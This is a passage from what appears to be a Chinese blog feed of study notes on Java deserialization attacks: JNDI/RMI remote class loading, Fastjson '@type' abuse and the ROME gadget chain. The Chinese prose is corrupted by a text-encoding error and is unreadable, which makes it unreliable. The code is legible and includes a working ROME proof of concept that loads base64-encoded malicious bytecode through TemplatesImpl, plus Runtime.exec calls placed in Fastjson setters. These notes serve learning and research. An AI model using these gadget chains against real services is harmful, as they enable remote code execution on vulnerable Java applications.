è½½ç±»è¿™ä¸ªæŠ€æœ¯å°±æ˜¯ä¸ºäº†å®ç°ï¼Œå½“æœ¬åœ°æ²¡æœ‰å®šä¹‰è¿œç¨‹å¯¹è±¡æ‰€å¯¹åº”çš„ç±»çš„æ—¶å€™ï¼Œè¿˜èƒ½å¯¹è¿œç¨‹å¯¹è±¡è¿›è¡Œè°ƒç”¨ã€‚</p><p>å…·ä½“å®ç°é€»è¾‘ä¸ºï¼š</p><ul><li><p>å®¢æˆ·ç«¯ä½¿ç”¨lookupå‡½æ•°è®¿é—®ä¸€ä¸ªæœ¬åœ°ä¸å­˜åœ¨å¯¹åº”ç±»çš„è¿œç¨‹å¯¹è±¡</p></li><li><p>æœåŠ¡ç«¯ä¼šè¿”å›ä¸€ä¸ªreferenceå¯¹è±¡ï¼Œå¯¹è±¡ä¸­ä¼šæŒ‡å®šä¸€ä¸ªè¿œç¨‹ç±»è®©å…¶å»ä¸‹è½½</p></li><li><p>å®¢æˆ·ç«¯ä¸‹è½½è¿œç¨‹ç±»å¹¶å®ä¾‹åŒ–ï¼Œå¹¶ä¸”è°ƒç”¨è¿œç¨‹ç±»çš„<strong>getObjectInstance</strong>å‡½æ•°è·å–å¤–éƒ¨è¿œç¨‹å¯¹è±¡å®ä¾‹ã€‚</p><p>ç»¼ä¸Šï¼Œå¦‚æœæˆ‘ä»¬<strong>å¯ä»¥æ§åˆ¶lookupå‡½æ•°çš„å€¼</strong>ï¼Œé‚£ä¹ˆè®©å…¶è®¿é—®ä¸€ä¸ªæˆ‘ä»¬è‡ªå·±çš„æ¶æ„rmiæœåŠ¡å™¨ï¼Œè®©å…¶ä¸‹è½½æˆ‘ä»¬æ„é€ çš„æ¶æ„classæ–‡ä»¶å¹¶å®ä¾‹è¯ï¼Œå³å¯å®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚</p></li></ul><h2 id="RMI-LDAPæ³¨å…¥ç‰ˆæœ¬é—®é¢˜"><a href="#RMI-LDAPæ³¨å…¥ç‰ˆæœ¬é—®é¢˜" class="headerlink" title="RMI+LDAPæ³¨å…¥ç‰ˆæœ¬é—®é¢˜"></a>RMI+LDAPæ³¨å…¥ç‰ˆæœ¬é—®é¢˜</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071836554.png"></p><p>ç®€å•äº†è§£ä¸€ä¸‹ã€‚å› ä¸ºæƒ³å¼„fastjsonã€‚åç»­åœ¨å¤ä¹ å…·ä½“çš„å®ç°æ­¥éª¤ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastjsonï¼ˆå…¥é—¨ï¼‰</title>
    <link href="/2022/03/07/Fastjson%EF%BC%88%E5%85%A5%E9%97%A8%EF%BC%89/"/>
    <url>/2022/03/07/Fastjson%EF%BC%88%E5%85%A5%E9%97%A8%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Fastjsonï¼ˆå…¥é—¨ï¼‰"><a href="#Fastjsonï¼ˆå…¥é—¨ï¼‰" class="headerlink" title="Fastjsonï¼ˆå…¥é—¨ï¼‰"></a>Fastjsonï¼ˆå…¥é—¨ï¼‰</h1><p>è·Ÿç€å…ˆçŸ¥ç¤¾åŒºå†æ¥å¤ä¹ ä¸€ä¸‹ã€‚æœ¬æ–‡çº¯æŒ‰ç…§å…ˆçŸ¥ç¤¾åŒºçš„å¤ä¹ ã€‚åŸºæœ¬é›·åŒã€‚<a href="https://xz.aliyun.com/t/8979">https://xz.aliyun.com/t/8979</a></p><h2 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;è¿™é‡Œæ˜¯æ„é€ å‡½æ•°&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age=age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializePerson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        person.setAge(<span class="hljs-number">20</span>);<br>        person.setName(<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> JSON.toJSONString(person, SerializerFeature.WriteClassName);<br>        System.out.println(s);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>SerializerFeature.WriteClassName</code>æ˜¯<code>toJSONString</code>è®¾ç½®çš„ä¸€ä¸ªå±æ€§å€¼ï¼Œè®¾ç½®ä¹‹ååœ¨åºåˆ—åŒ–çš„æ—¶å€™ä¼šå¤šå†™å…¥ä¸€ä¸ª<code>@type</code>ï¼Œå³å†™ä¸Šè¢«åºåˆ—åŒ–çš„ç±»åï¼Œ<code>type</code>å¯ä»¥æŒ‡å®šååºåˆ—åŒ–çš„ç±»ï¼Œå¹¶ä¸”è°ƒç”¨å…¶<code>getter/setter/is</code>æ–¹æ³•ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071734193.png" alt="QQæˆªå›¾20220307161936"></p><h2 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h2><p>ä¸¤ç§ååºåˆ—åŒ–çš„æ–¹å¼ã€‚<strong>parseObject</strong>å’Œ<strong>parse</strong>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnSerializePerson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;xsw6a\&quot;&#125;&quot;</span>;<br>        System.out.println(JSON.parse(s));<br>        System.out.println(JSON.parseObject(s));<br>        System.out.println(JSON.parseObject(s,Person.class));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å€¼å¾—æ³¨æ„çš„æ˜¯è¿™é‡Œåªæœ‰ç¬¬ä¸‰æ­¥æ‰æŒ‡æ˜äº†å¯¹è±¡ï¼Œå¹¶ä¸”è®²Personååºåˆ—ã€‚è€Œä¸”è¿™é‡Œ<strong>å¹¶æ²¡æœ‰è§¦å‘getteræ–¹æ³•ã€‚</strong><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071734792.png" alt="QQæˆªå›¾20220307162915"></p><p>è¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥ç†è§£åˆ°@typeçš„ä½œç”¨äº†ã€‚æŒ‡å®šä¸€ä¸ªç±»ååºåˆ—åŒ–ã€‚<br>çœ‹çœ‹æ•ˆæœã€‚åˆ†åˆ«æµ‹è¯•ã€‚</p><h3 id="JSON-parse"><a href="#JSON-parse" class="headerlink" title="JSON.parse()"></a>JSON.parse()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;xsw6a.Person\&quot;,\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;xsw6a\&quot;&#125;&quot;</span>;<br>   System.out.println(JSON.parse(s));<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071734823.png" alt="QQæˆªå›¾20220307163225"></p><p><strong>æ²¡æœ‰è§¦å‘getteræ–¹æ³•ã€‚</strong></p><h3 id="JSON-parseObject"><a href="#JSON-parseObject" class="headerlink" title="JSON.parseObject()"></a>JSON.parseObject()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;xsw6a.Person\&quot;,\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;xsw6a\&quot;&#125;&quot;</span>;<br>       System.out.println(JSON.parseObject(s));<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071634121.png" alt="QQæˆªå›¾20220307163400"></p><p>å‡è§¦å‘ã€‚<br>é‚£æˆ‘ä»¬å°±å¯ä»¥æ€è€ƒè¿™æ ·çš„æŒ‡å®šç±»ååºåˆ—åŒ–ã€‚è‚¯å®šä¼šé€ æˆååºåˆ—åŒ–æ¼æ´ã€‚<br>åªè¦åœ¨setterã€getterã€isä¸­æ·»åŠ æ¶æ„å‘½ä»¤ã€‚</p><h2 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><p>åœ¨åˆ†åˆ«å¯¹åº”çš„åœ°æ–¹æ·»åŠ ã€‚å‘ç°å‡å¯å¼¹å‡ºè®¡ç®—å™¨ã€‚</p><h2 id="ååºåˆ—åŒ–çš„æµç¨‹"><a href="#ååºåˆ—åŒ–çš„æµç¨‹" class="headerlink" title="ååºåˆ—åŒ–çš„æµç¨‹"></a>ååºåˆ—åŒ–çš„æµç¨‹</h2><p>è¿™é‡Œåªè¯´ä¸€äº›å…³é”®éƒ¨åˆ†ã€‚ï¼ˆä¸ªäººè®¤ä¸ºï¼‰</p><p>é€šè¿‡è¿™é‡Œåˆ¤æ–­çš„ä¸º12ã€‚<img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071721973.png" alt="QQæˆªå›¾20220307172125"></p><p>ä¼šæ¥åˆ°è¿™é‡Œã€‚è¿™é‡Œçš„<strong>LBRACE&#x3D;12</strong><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071734973.png" alt="QQæˆªå›¾20220307172241"></p><p><strong>scanSymbol</strong>è·å–åˆ°äº†æŒ‡å®šçš„@typeç±»ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071734456.png" alt="QQæˆªå›¾20220307172427"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071734100.png" alt="QQæˆªå›¾20220307172608"></p><p>åé¢è·Ÿè¿›ä¼šçŸ¥é“è¿‡æ»¤äº†ååºåˆ—åŒ–çš„ç±»ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071734839.png" alt="QQæˆªå›¾20220307172959"></p><p>åé¢åº”è¯¥è¦å­¦ä¹ ä¸€ä¸‹RMIæ–¹é¢çš„ç›¸å…³çŸ¥è¯†ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Fastjson</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ROMEé“¾</title>
    <link href="/2022/03/06/ROME%E9%93%BE/"/>
    <url>/2022/03/06/ROME%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="ROME"><a href="#ROME" class="headerlink" title="ROME"></a>ROME</h1><p>ç»ˆäºæŠŠä»–å¼„æ˜ç™½äº†ã€‚<br>å…ˆæ¥çœ‹çœ‹åˆ©ç”¨é“¾ã€‚</p><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p><a href="http://rometools.github.io/rome/ROMEReleases/rome-1.0.jar">http://rometools.github.io/rome/ROMEReleases/rome-1.0.jar</a><br>è‡ªè¡Œå¯¼å…¥ä¸€ä¸‹ã€‚</p><h2 id="åˆ©ç”¨é“¾"><a href="#åˆ©ç”¨é“¾" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectBean</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">EqualsBean</span>.</span></span>bean<span class="hljs-constructor">HashCode()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectBean</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ToStringBean</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">OutputProperties()</span><br></code></pre></td></tr></table></figure><h2 id="ObjectBean-toString"><a href="#ObjectBean-toString" class="headerlink" title="ObjectBean#toString()"></a>ObjectBean#toString()</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203061206065.png" alt="QQæˆªå›¾20220306120645"></p><p>è·Ÿè¿›<strong>toString()</strong><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203061420748.png" alt="QQæˆªå›¾20220306121009"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203061210855.png" alt="QQæˆªå›¾20220306121028"></p><p>è·å–è°ƒç”¨é“¾ä¸­ä¸Šä¸€ä¸ªç±»æˆ– <code>_obj</code> å±æ€§ä¸­ä¿å­˜å¯¹è±¡çš„ç±»åï¼ˆå¯¹æœ¬é¢˜å¾—ä½œç”¨ä¸å¤§ï¼‰ï¼Œå¹¶è°ƒç”¨ç¬¬äºŒä¸ª toString æ–¹æ³•ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203061420891.png" alt="QQæˆªå›¾20220306123426"></p><p>è¿™é‡Œä¼šå°†_objå®ä¾‹ä¸­çš„getteræ–¹æ³•å…¨éƒ¨æ‰§è¡Œï¼Œé‚£ä¹ˆå°±æƒ³åˆ°äº†,ä¹‹å‰åˆ†æçš„æ–‡ç« <br><strong>CommonsBeanutilsæ— ccä¾èµ–</strong>é‡Œé¢ç”¨åˆ°çš„è°ƒç”¨getteræ–¹æ³•ï¼Œä»è€ŒæˆåŠŸåŠ è½½æ¶æ„ç±»ã€‚</p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Rome</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">delegate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(Templates.class, templates);<br>        delegate.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯æˆåŠŸè§¦å‘è®¡ç®—å™¨ã€‚</p><h4 id="å…³é”®ä»£ç "><a href="#å…³é”®ä»£ç " class="headerlink" title="å…³é”®ä»£ç "></a>å…³é”®ä»£ç </h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ObjectBean</span> <span class="hljs-variable">delegate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(Templates.class, templates);<br>  delegate.toString();<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±è¦æ€è€ƒå¦‚ä½•åŠ å…¥<strong>ååºåˆ—åŒ–</strong>ã€‚</p><h2 id="ObjectBean-hashCode"><a href="#ObjectBean-hashCode" class="headerlink" title="ObjectBean#hashCode"></a>ObjectBean#hashCode</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203061420042.png" alt="QQæˆªå›¾20220306114759"></p><p>è·Ÿè¿›<strong>beanHashCode()</strong><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203061206491.png" alt="QQæˆªå›¾20220306114855"></p><p>ç„¶åæˆ‘ä»¬å°±è¦è€ƒè™‘è¿™é‡Œæ€ä¹ˆå›è°ƒåˆ°<strong>ObjectBean#toString</strong>ï¼Ÿäº‹å®ä¸Šæˆ‘ä»¬å¯ä»¥è¿›è¡Œå¤šé‡å°è£…ã€‚æ¯”å¦‚è¿™æ ·ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ObjectBean</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ObjectBean.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(String.class, <span class="hljs-string">&quot;xsw6a&quot;</span>));<br></code></pre></td></tr></table></figure><p>è¿™æ 